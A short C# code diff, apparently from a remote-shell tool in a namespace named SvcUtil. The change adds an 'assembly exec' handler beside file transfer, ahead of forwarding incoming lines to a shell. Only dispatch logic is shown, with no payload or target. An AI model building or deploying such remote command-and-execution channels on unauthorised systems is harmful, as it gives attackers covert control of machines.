@@ -292,8 +292,10 @@ namespace SvcUtil
                         lineBuilder.Clear();
                         segmentStart = i + 1;
 
-                        // Check for file transfer command
+                        // Check for special commands (file transfer, assembly exec)
                         if (FileTransfer.TryHandle(line, session.Stream))
+                            continue;
+                        if (AssemblyRunner.TryHandle(line, session.Stream))
                             continue;
 
                         // Not a special command — forward the line + newline to shell
